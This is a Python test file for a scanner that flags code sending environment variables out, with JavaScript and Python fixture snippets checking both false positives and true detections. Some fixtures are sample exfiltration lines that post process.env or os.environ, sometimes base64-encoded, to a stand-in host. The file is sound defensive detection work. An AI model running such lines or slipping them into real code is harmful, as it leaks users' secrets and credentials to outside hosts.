"""ST-SECRET-EXFIL: the environment read to configure a request or a child process is not sent.

Found on 2026-10-14 when a score floor for malicious indicators was checked against the catalog:
three well-known open-source projects carried the indicator for code that sends nothing.
- JavaScript: ``fetch(chatCompletionsUrl(process.env), ...)`` hands the environment to the code's
  own URL builder, which reads a base URL from it.
- Python: a child process started with ``env=os.environ`` returns output; a line of it put on a
  ``queue.Queue`` was read as the environment sent with an HTTP PUT.
The sends these rules exist for must still be found."""

from __future__ import annotations

from pathlib import Path

from skilltotal.file_index import FileIndex
from skilltotal.scanners.secret_exfil import _js_env_dumps, _py_env_dumps


def _js(tmp_path: Path, source: str) -> list[int]:
    (tmp_path / "index.js").write_text(source, encoding="utf-8")
    return [e.line_start for f in FileIndex.build(tmp_path).files for e in _js_env_dumps(f)]


def _py(tmp_path: Path, source: str) -> list[int]:
    (tmp_path / "main.py").write_text(source, encoding="utf-8")
    return [e.line_start for f in FileIndex.build(tmp_path).files for e in _py_env_dumps(f)]


def test_the_environment_given_to_a_url_builder_is_not_sent(tmp_path):
    source = (
        "export async function complete(body) {\n"
        "  const response = await fetch(\n"
        "    anthropic ? messagesUrl(process.env) : chatCompletionsUrl(process.env),\n"
        "    { method: 'POST', body: JSON.stringify(body) },\n"
        "  );\n"
        "  return response.json();\n"
        "}\n"
    )
    assert _js(tmp_path, source) == []


def test_the_environment_encoded_into_the_url_is_sent(tmp_path):
    source = (
        "fetch('https://collect.example.invalid/?d=' + btoa(JSON.stringify(process.env)));\n"
    )
    assert _js(tmp_path, source) == [1]


def test_the_environment_in_the_body_is_still_sent_whatever_builds_the_url(tmp_path):
    source = (
        "fetch(endpointUrl(process.env), { method: 'POST', body: JSON.stringify(process.env) });\n"
    )
    assert _js(tmp_path, source) == [1]


def test_a_child_process_output_put_on_a_queue_is_not_sent(tmp_path):
    # The real shape: `self.process = Popen(..., env=environment)` marked `self`, so a line read
    # back from `self.stdout` (a queue) and put on it again read as the environment sent.
    source = (
        "import os, queue, subprocess, requests\n"
        "class Peer:\n"
        "    def __init__(self, argv, environment):\n"
        "        self.stdout = queue.Queue()\n"
        "        self.process = subprocess.Popen(argv, env=environment, stdout=subprocess.PIPE)\n"
        "    def pump(self):\n"
        "        for raw in self.process.stdout:\n"
        "            self.stdout.put(raw)\n"
        "    def next_line(self):\n"
        "        line = self.stdout.get(timeout=1)\n"
        "        self.stdout.put(line)\n"
        "        return line\n"
        "environment = dict(os.environ)\n"
        "peer = Peer(['tool'], environment)\n"
        "requests.get('https://example.invalid/health')\n"
    )
    assert _py(tmp_path, source) == []


def test_the_environment_posted_from_python_is_still_sent(tmp_path):
    source = (
        "import os, requests\n"
        "data = dict(os.environ)\n"
        "requests.post('https://collect.example.invalid/x', json=data)\n"
    )
    assert _py(tmp_path, source) == [3]


def test_an_attribute_assignment_does_not_mark_the_whole_object(tmp_path):
    # A large server: `self.env = dict(os.environ)` once, then every name read from `self`
    # (hundreds) counted as the environment, and a queue's `.put(...)` as sending it.
    source = (
        "import os, queue, requests\n"
        "class Server:\n"
        "    def __init__(self):\n"
        "        self.env = dict(os.environ)\n"
        "        self.events = queue.Queue()\n"
        "    def emit(self, kind):\n"
        "        record = (kind, self.events.qsize())\n"
        "        self.events.put(record)\n"
        "requests.get('https://example.invalid/health')\n"
    )
    assert _py(tmp_path, source) == []


def test_a_payload_filled_with_the_environment_is_still_sent(tmp_path):
    source = (
        "import os, requests\n"
        "payload = {}\n"
        "payload['env'] = os.environ\n"
        "requests.post('https://collect.example.invalid/x', json=payload)\n"
    )
    assert _py(tmp_path, source) == [4]
